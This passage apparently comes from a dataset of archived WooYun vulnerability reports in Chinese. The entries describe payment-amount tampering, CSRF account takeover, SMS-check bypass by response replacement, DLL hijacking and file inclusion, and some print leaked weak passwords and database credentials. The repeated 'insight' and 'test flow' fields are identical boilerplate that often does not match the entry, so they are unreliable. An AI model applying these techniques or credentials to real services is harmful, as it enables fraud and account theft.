**POC**: 1 可以看到上图中，已经是跳转到了某电商平台的支付页面了，已经是某电商平台的域名了，所以优个的服务器已经无法控制了，这里我就不去支付了。2 然后还有个问题需要说明，这里由于是在支付的时候进行的串改，所以在订单中显示的支付金额应该还是原价，所以一般也很难被发现吧。包括你们后台的录订单的信息应该也是正常的，只是某电商平台的真正收款被串改了。3 所以，有可能这个漏洞已经被不法分子给利用了，建议你们还是自己排查排查下吧。目测如果被利用，然后要找出来，难度也挺大的！所以还是赶紧修补吧！！！

**绕过**: 直接利用

**修复**: 1 支付过程中加一个服务器生成的key，用户校验参数有没有被串改。2 优个网真心挺不错，好多东西都好想买，求送点礼品卡。
---

---
### [wooyun-2013-024373] WP版某搜索引擎浏览器一个钓鱼欺诈漏洞
**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 对https://example.com/[已脱敏] 的话，由于网页标题和地址栏在一起，可能会带来更强的欺骗性，因为用户即使点击了标题，地址栏显示的也是最前面几个字符（如证明）

**POC**: 例如构造钓鱼网页https://example.com/[已脱敏] - 某搜索引擎账号</title><body> phishing contents .. </body></html>用户打开后地址栏（如果用户不手动往后拖动的话，但是由于点击以后默认是地址全选状态所以拖动很麻烦）和标题均会显示“https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 见证明
---

---
### [wooyun-2015-0164293] 奥鹏教育某业务后台设计逻辑缺陷（附账号证明）
**厂商**: open.com.cn | **年份**: 2015 | **类型**: 服务弱口令

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 服务弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别服务弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 奥鹏教育https://example.com/[已脱敏]  lina密码  123456

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加验证码，排除弱口令
---

---
### [wooyun-2015-0146470] 某市政府邮箱系统设计逻辑缺陷导致信息泄露
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/用123456+top500姓名爆破，得到2枚弱口令liuyong 123456zhangjianjun 123456

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 改密码
---

---
### [wooyun-2013-018228] 好大夫密码找回缺陷问题打包
**厂商**: 好大夫在线 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 思路比较混乱，先发个支付漏洞，礼物那里重置金额更改1 现在开始将密码漏洞，首先注册时不填邮箱，但填手机的，无需验证码，这个时候就会导致一个可以利用的问题，为什么说可以利用呢，我可以csrf诱骗很多人的手机号改为我的，然后我想怎么找回密码都可以，如图为13800138000的手机号用户，不知道能不能去改医生的账号2 修改邮箱和手机都是post，但解析的时候修改手机get也能够解析，也能够通过csrf进行更改手机号和邮箱url能够直接更改的原因在于解析post没有控制只解析form而不解析url传参csrf的话关键功能需要增加防护token危害性在于哪里，用户点击url或者访问某网址但好大夫的cookies没有失效的话会自动更改注册的手机号和邮箱，由于设计缺陷找回密码不需要输入用户名，我根本不需要知道改了哪个用户的，系统自动回告诉我，医生的能改影响就很大了

**POC**: 手机号更改的url 放在网站上或发给别人就可以https://example.com/[已脱敏] id="wrhoooo" name="wrhoooo" action="https://example.com/[已脱敏]" method="post"><input type="test" name="isReceiveRepl

**绕过**: 直接利用

**修复**: 1 用户注册时输入手机需要输入验证码才能注册2 一个手机最好只能对应一个用户3 解析post数据时使用request.form，不要也把querysting的解析4 关键功能增加csrf防护的toekn5 支付的地方都要进行数据防篡改签名校验6 找回密码最好同时输入用户名邮箱和用户名手机号，确保用户
---

---
### [wooyun-2014-054959] 某电商平台声波支付可以被人记录声音恶意支付
**厂商**: 某电商平台 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某电商平台的声波离线支付虽然方便，但也带来了一定的安全问题，比如可以记录他人声波进行恶意消费。看到某电商平台可以离线声波支付，果断尝试了一下，感觉速度很快非常便捷，但是有一点却吓坏我了，我是在友宝机子上测试的，当我的手机靠近机子打开我要支付之后竟然没有提示要支付多少钱，也没有提醒是否支付便直接从我的银行卡中把钱扣了。好吧 其实我知道某电商平台的免密码支付是有限额的，但是这样消费的感觉还是让我不可接受。如果说上面的问题是不能说是一个问题的话，下面这个问题简直是把我惊呆了，废话不多说，直接说过程！！！！！！我用自己的手机打开声波支付的我要支付，用另一个手机将piu piu 的声音录制下来，然后用录音到友宝的机子上买饮料，竟然出货了 。重新播放录音，再次购买，又成功了 。

**POC**: 视频密码：147258其实被别人录制声音的可能性不是很大如果别人在机器上安装一个录音机的话，他便可以把你的声音录制下来随便买点什么的。

**绕过**: 直接利用

**修复**: 只需要在手机端再次验证一下即可，虽然体验上会差那么一点，还有离线支付的功能要实现的话估计要找其他方法了，但毕竟安全第一嘛。
---

---
### [wooyun-2015-095683] PPTV某接口已修复仍可暴力破解用户可撞库
**厂商**: PPTV(PPlive) | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 额。。自评RANK1吧，只是很奇怪。。先看两个洞和回复吧：WooYun: PPTV某接口涉及不当可导致可暴力破解可撞库（账号主站通用）WooYun: PPTV又又又一接口设计不当导致可暴力破解可撞库#4（账号主站通用+验证码绕过）这两个，第一个洞厂商说已经修复了，第二个洞厂商又说调用的是同一接口接下来先看一下第一个洞的接口吧：https://example.com/[已脱敏]

**POC**: 说好的礼物呢哥。。？：）

**绕过**: 过滤绕过

**修复**: 缺个移动硬盘存片子：）
---

---
### [wooyun-2015-093365] 益盟爱炒股商城支付逻辑漏洞
**厂商**: 益盟爱炒股 | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天无意间进入益盟爱炒股商城页面，想起来之前在乌云看过好多商城都有漏洞就想这个有没有呢。就进行了下面一系列测试，结果发现还真有，希望官方尽快修复，并希望乌云能送个邀请码。emoney.cn

**POC**: 进入商品页面看到商品价格购物页面，发现价格为588下个订单先检测是否过滤了小数，如果没过滤的话把购买数量变成小数价格自然会变提交订单，发现提交不成功，估计后台已经过滤过数字了。同理修改了下网页代码里面的价格，发现提交后价格还是588元。难道这样说就没漏洞了么？不尽然，接着抓包看看。发现价格和数量是在提交的cookie里面，而且竟然是明文显示，那么不管三七二十一修改下价格看看。继续运行发现还是不成功，提示订单数据不完整。本来以为到此结束了，结果无意间回到订单页面看了下发现了个很神奇的事情，订单价格竟然变成了1元。这样的话。。。付款看看。到此为止已经付款并提示购买成功。过了一会手机就提示收到激活码

**绕过**: 直接利用

**修复**: 提交订单时后台判断单价是否与数据库中相符，如不符则返回错误。
---

---
### [wooyun-2012-013132] 飞信客户数据越界获取
**厂商**: 某运营商 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 开启通讯录服务后，在他人Android手机登陆自己的飞信账户后，他人本地通信录的数据会自动上传至自己的飞信云端数据中，从而获取他人通讯录

**POC**: 在他人手机登陆自己的飞信账号，正常使用后退出。在自己手机或PC端登陆，可在通讯录一栏中看到他人的通讯录

**绕过**: 直接利用

**修复**: 检查相关操作流程，建立相应检查机制
---

---
### [wooyun-2011-02513] 移动手机支付业务逻辑漏洞（题目不能太明显）
**厂商**: 某运营商 | **年份**: 2011 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 这是错误页面提醒：“对不起，验证码错误”无限次请求，在一段时间内，验证码不变，具体多长时间我没测试。...手机没电了，就不抓图了。空了补上。

**绕过**: 直接利用

**修复**: 修补漏洞时，应该把周围的东西，都看看。不要修补一个，就不管近在咫尺的另一个明显问题。
---

---
### [wooyun-2013-018906] 故宫博物院票务预订系统（永乐票务）存在严重支付漏洞
**厂商**: 北京春秋永乐文化传播有限公司 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天大雪封路  没有去幼儿园报名 呆在家里没事做给整出来的...https://example.com/[已脱敏]  永乐票务系统的先注册一个账号 然后开始订票由于没有对购买数量进行严格限制提交订单后改包直接导致了下图情况然后选择某电商平台支付..(没有继续深入 20块钱可不是一个小数目,况且人还不在北京..)继续看下去 发现永乐不仅仅只是这一个站点有此漏洞主订票站 https://example.com/[已脱敏] 也存在诸如此类漏洞望技术能够好好看看 该补的趁早补补..

**POC**: 故宫一日游 仅仅只需20元哦亲 还包邮~~PS:诚心求枚码啊,在乌云外围观望好久了...

**绕过**: 直接利用

**修复**: 既然是个独立的订票系统 为什么不使用SSL进行对支付页面的加密呢?
---

---
### [wooyun-2014-055014] 某互联网公司文件传输功能存在设计漏洞（可能导致用户执行恶意exe文件）
**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1,，先发送一个可执行文件（文件名：A.EXE）2，接着发送一个不为空的文件夹(文件夹名字：A)3，点击后面的那个打开4，执行的却是那个EXE可执行文件

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修复逻辑
---

---
### [wooyun-2015-0119551] p2p金融安全之爱投资存在某逻辑缺陷
**厂商**: 爱投资 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: p2p金融安全之爱投资存在某逻辑缺陷，可绕过原手机校验修改用户绑定手机1、进行修改绑定手机操作2、校验原手机号时，提交任意短信码（此处为123456）3、返回响应报内容如下：4、使用：{"data":[],"code":0,"info":"\u9a8c\u8bc1\u539f\u624b\u673a\u53f7\u6210\u529f"}替换该响应包内容5、释放请求后，成功进入新手机设置页面6、成功绑定新手机号

**POC**: 参见详细说明

**绕过**: 过滤绕过

**修复**: 完善认证逻辑
---

---
### [wooyun-2013-043240] 某互联网公司消息管理器存在设计缺陷（多版本bug）
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上一次提交这个漏洞没有通过审核，我这次写详细些。我专门在网上把某IM软件的历史版本都找出来了，好辛苦。发现这个问题存在已经有整整一年了啊！【从2012年11月发布的某互联网公司2013 Beta1到现在的最新的某互联网公司2013SP4】我觉得这不能说影响不大。为了说明问题，我在计算机上安装了冰点还原精灵(Deep Freeze)7.51，每次重启计算机后测试一个某互联网公司版本。测试版本：某互联网公司2012 正式版由于某互联网公司2012的消息管理器在删除消息记录时没有【一段时间】这个选项，所以不存在问题。测试版本：某互联网公司2013 Beta1(5459)【2012年11月发布的版本】如图，打开消息管理器，在某个分组上点右键，选删除消息记录在新窗口再选 只删除【一段时间】的消息记录，然后在下方的日历中选时间段。问题出来了：开始时间任意选（只要比截止时间早就行），截止时间选择 1/3/5/7/8/10/12月 的 31日 时，就会出

**POC**: 如图，在某互联网公司2013中，问题一直存在：

**绕过**: 直接利用

**修复**: 其实这个大小月的细节很好修复，只是设计缺陷，你懂的。
---

---
### [wooyun-2014-052524] 广东某市级移动接口未限制导致短信轰炸
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] /smGenerator.action HTTP/1.1x-requested-with: XMLHttpRequestAccept-Language: zh-cnReferer: https://example.com/[已脱敏] */*Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727)Host: www.dghui.comContent-Length: 52Proxy-Connec

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 节操在哪？能否一天三条？一个小时三条？
---

---
### [wooyun-2015-091143] 万达支付漏洞（修复后还有点小问题）
**厂商**: 大连万达集团股份有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 加入购物车的时候抓包改数量-5为可以支付的，应该算是支付漏洞吧

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂
---

---
### [wooyun-2015-092336] 公交e路wifi设计缺陷,可刷金币,兑换流量,直到负数
**厂商**: e路wifi | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先下载官方的APP,网址在这,大家可以自行下载https://example.com/[已脱敏] 2金币/次安装游戏 100金币/次安卓小说或者普通APP 50金币/次所以,我才不会去阅读文章,太少.安装应用在自己手机里也太不好,就想到了在Android X86里来刷金币(虚拟机太烦了,体验也不好)Android X86的文件都有备份,每次系统安装完垃圾直接替换新的文件,省去再次安装的烦恼在刷金币时发现一处漏洞,应该是下载完成,并且安装完成应用之后才会有金币奖励的.但是我发现只需要下载了apk文件完成,就有金币奖励,虽然实在跳转到安装界面时才有奖励,但是我完全可以取消安装,就像下图一样因为是用Android X86来刷的,具体手机怎么样,没试验然后短短20分钟就刷到了1

**POC**: 首先下载官方的APP,网址在这,大家可以自行下载https://example.com/[已脱敏] 2金币/次安装游戏 100金币/次安卓小说或者普通APP 50金币/次所以,我才不会去阅读文章,太少.安装应用在自己手机里也太不好,就想到了在Android X86里来刷金币(虚拟机太烦了,体验也不好)Android X86的文件都有备份,每次系统安装完垃圾直接替换新的文件,省去再次安装的烦恼在刷金币时发现一处漏洞,应该是下载完成,并且安装完成应用之后才会有金币奖励的.但是我发

**绕过**: 直接利用

**修复**: 至少该把我的金币变成正的吧
---

---
### [wooyun-2015-092697] 第一p2p某处设置缺陷可以获知平台所有用户手机号（进行后续爆破登录）
**厂商**: firstp2p.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在注册页面可以进行批量扫号在登陆处验证码可绕过，可进行暴力破解

**POC**: 果真是第一p2p 用户量相当大呀成功扫出来的用户手机号简单破解一个，就成功了登陆一下

**绕过**: 过滤绕过

**修复**: 验证码用过后重置账户连续登陆错误超过5次进行锁定
---

---
### [wooyun-2014-084967] 遨游浏览器升级漏洞可导致劫持种马
**厂商**: 傲游 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 遨游浏览器在升级时会以GET方式请求四个包其中与升级有关的是/mx3manual/updater_index.htm.php?ver=[IP已脱敏]0&pn=max4&producttype=zh-cn&mac=000c29a85fd9&lng=zh-cn&update_type=manual&ver_type=stable&t=1411110647也就是说遨游浏览器向服务器请求的是：updatecn.maxthon.com/mx3manual/updater_index.htm.php然后服务器返回一个压缩过的升级配置程序mxup.exe,解压前和解压后：然后浏览器自动执行这个升级程序完

**绕过**: 直接利用

**修复**: 使用ras
---

---
### [wooyun-2016-0187166] 魔方网络某处设计逻辑缺陷导致可重置官方账号
**厂商**: mofang.com | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 不好意思，跟你们的官方账号绑定了手机号。带来不便，请多包涵开始说问题https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不好意思不好意思不好意思。请解绑吧。魔方宝贝（80001）跟mofang_admin(110001),请解绑权限控制还是要做滴。。。
---

---
### [wooyun-2016-0175275] 某电商平台绕过安全环境检测记录登录密码/支付密码
**厂商**: 某电商平台 | **年份**: 2016 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-028635] 金山卫士可信任路径漏洞
**厂商**: 某软件厂商 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 存在可信任路径漏洞

**POC**: 金山卫士的手机助手存在可信任路径漏洞，在c盘放置Program.exe后，每次开启手机助手都会优先执行该Program.exe ,恶意软件可以通过这种方式每次加载启动。

**绕过**: 直接利用

**修复**: 金山卫士起“手机助手”进程时加双引号
---

---
### [wooyun-2012-09403] 这样劫持，杀毒们，你们敢杀么？
**厂商**: 杀毒软件 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 狗咬狗还有看主人 你杀毒牛b 不还是怕微软

**绕过**: 直接利用

**修复**: 杀毒们 牛 ??????
---

---
### [wooyun-2015-0103259] 云锁最新版1.4.121防护可绕过
**厂商**: 云锁 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 参数注入

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 去云锁官网查看了下今天出的新版本：适合：Windows 2003/Windows 2008/Windows 2012支持：IIS、Apache版本：win_1.4.121更新：2015-3-23存在一处设计缺陷，默认配置打开还是不检测POST和cookie传递的参数。另外对请求中的header完全没有防护，导致可注入获取敏感数据

**POC**: 直接看看危害吧：1.默认配置对POST请求很多防护没被勾选导致注入：2.请求中的header头字段完全没有防护：把所有防护都打开配置一个请求的header中获取ip的注入为例：直接把管理员账户密码显示出来了

**绕过**: 直接利用

**修复**: 添加防护规则
---

---
### [wooyun-2015-0117083] 12308订单支付时的总价未验证漏洞(支付逻辑漏洞)
**厂商**: 深圳市一二三零八网络科技有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在支付时可以修改订单总价,为了避免不必要的麻烦,未完成支付的最后一步.但是跳转到某电商平台价格已被修改。未完全确认，希望厂商自行测试。1.下单2.修改

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强验证
---

---
### [wooyun-2012-014717] 珍品网修改订单任意金额支付
**厂商**: 珍品网 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注册下单，支付，选择拉卡拉支付截断http请求，更改post金额数据提交

**POC**: 到拉卡拉支付页面发现金额被修改，也未提示该修改无效，有些网站修改后会提示该支付订单异常，接口应该升级过，估计拉卡拉没有联系你们支付后是否能够成功修改订单状态不知道，你们可以试一试

**绕过**: 截断攻击

**修复**: 按照拉卡拉最新接口文档去修改，就不会有这个问题，或者加已支付金额项，已支付金额不等于订单金额订单就不变为已付款，都是高端商品啊，发一个货客户就赚大了
---

---
### [wooyun-2015-0142761] 某快递公司旗下“有物”某互联网公司购物平台漏洞之查看任意订单
**厂商**: 某快递公司速运 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 点击一个订单长按，拷贝订单地址，可以看见https://example.com/[已脱敏]

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 我不懂。。
---

---
### [wooyun-2014-084076] 新开普一卡通免费消费且系统无纪录续集（一卡通支付漏洞）
**厂商**: 新开普电子股份有限公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、系统检测到两次异常消费下发黑名单冻结卡需要时间，在这个时间内我可以重复消费>3次2、厂商对上次提交的问题进行修复，已经用冻结消费来防止类似消费行为，但是去解冻处理后并没有对账目进行纠正。3、也就是说用复制的一卡通在pos机上大额费，然后用自己的一卡通小额消费，卡会被冻结，用自己的一卡通去解冻后系统未对卡上消费金额进行纠正，用户实际花了200大洋买了东西，但是卡上和系统里实际只扣了0.01大洋。我又可以快乐的购物了，虽然要多跑下路。

**POC**: 克隆卡余额克隆卡大金额消费原始卡余额原始卡小额消费过一会后卡被冻结大概2分钟左右，在这期间我还可以用更多的克隆卡消费解冻去钱又回来了。。。。

**绕过**: 直接利用

**修复**: 既然你以经把消费都入库了。。。你就把卡上的金额和库里的同步下啊，还有你上面那么多灰帐，这种用户去解冻的时候敢不敢给操作员一个大大的警告。。。。
---

---
### [wooyun-2016-0168088] 多点APP商家后台设计逻辑缺陷订单信息泄露（附账号证明）
**厂商**: dmall.com | **年份**: 2016 | **类型**: 服务弱口令

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 服务弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别服务弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: erp.dmall.com后台未做验证码   可以直接fuzz随便选一个账号经行登录例：lijing   123456

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 添加验证码  更改弱口令
---

---
### [wooyun-2015-0109736] ourphp逻辑漏洞刷钱
**厂商**: ourphp.net | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这是demo地址https://example.com/[已脱敏] https://example.com/[已脱敏]

**POC**: 以上

**绕过**: 直接利用

**修复**: 后端要检验，你们更专业
---

---
### [wooyun-2013-033898]  风行网络电影客户端DLL新型劫持漏洞
**厂商**: 北京风行在线技术有限公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Funshion.exe存在严重dll劫持漏洞，可加载指定dll后执行任意代码。Funshion.exe启动时会加载一个不存在的名为ieframe.dll，只要自己写一个ieframe.dll与Funshion.exe放在同一目录，这样就可以在运行Funshion.exe的时候同时加载ieframe.dll，ieframe.dll可以为自制的任意恶意dll。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的！
---

---
### [wooyun-2013-034344] 移动139邮箱伪造发信地址
**厂商**: 某运营商 | **年份**: 2013 | **类型**: 钓鱼欺诈信息

**元思考**: 触发信号: 功能测试

**洞察**: 钓鱼欺诈信息防护不足，开发者信任前端输入

**测试流程**:
1. 识别钓鱼欺诈信息相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过伪造某运营商139邮箱10086@chinamobile.com系统信箱（当然、可以伪造为省、地方移动信箱比如陕西移动：10086@sn.chinamobile.com）对手机发送Email，系统未做短信提醒限时导致短信轰炸，而且发送的内容可被恶意钓鱼.而且每次的系统发过来手机号不一样，安全类软件显示无法拦截。（上图：伪造中国系统信箱，对手机发送Email）（我网速不太好，就随意的猛戳了4、5下，基本上时间间隔不断的短信过来。自己可以抓包提交等方法实现批量短信轰炸，你们比我高、您们懂得）(上图：为系统发过来过来的短信提醒内容)上面附上一张，我简单试验的钓鱼图，内容怎么利用，大家懂得！！！求乌云哥哥给个邀请码！

**POC**: ---------------------------------------------------

**绕过**: 直接利用

**修复**: 你们专业！
---

---
### [wooyun-2014-083516] 布丁移动任意文件包含|验证码绕过(可获取153万用户密码，已入后台)
**厂商**: 创新工场 | **年份**: 2014 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件包含位于：https://example.com/[已脱敏]

**POC**: MySQL数据库：host = '[IP已脱敏]', user = 'yangyu', passwd = 'netjava', db = 'martin', charset = 'utf8'host = '[IP已脱敏]', port = 3308, db = 'martin',user = 'yangyu', passwd = 'netjava', charset = 'utf8'    可远程连接host = '[IP已脱敏]',user = 'yangyu', passwd = 'netjava', db = 'vcar_sumrise', chars

**绕过**: 直接利用

**修复**: 1. 参数过滤，解决任意文件包含2. 验证码使用一次之后必须过期
---

---
### [wooyun-2015-0144162] 优倍商城存在支付漏洞可实现0元购物
**厂商**: 优倍商城 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 优倍商城存在支付漏洞 实现0元购物支付成功之后，待发货了。稍后俺联系你们的客服，让你们别发货。最后，请把8块钱还给我，，那是16包辣条阿！！！

**POC**: 订单验证商品数量是否小于1

**绕过**: 直接利用

**修复**: sorry，我不是程序员。。
---

---
### [wooyun-2014-065476] ecshop设计缺陷导致存在脱裤风险
**厂商**: ShopEx | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 后台管理

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 后台备份数据库的地方，如果在windows系统下可以通过短文件名直接访问。这是我找的一个证明此问题可以脱裤的站

**POC**: 后台备份数据库的地方，如果在windows系统下可以通过短文件名直接访问。这是我找的一个证明此问题可以脱裤的站

**绕过**: 直接利用

**修复**: 你们懂！
---

---
### [wooyun-2015-0103653] 2345浏览器下载功能未限制同源可造成RFD攻击
**厂商**: 2345网址导航 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
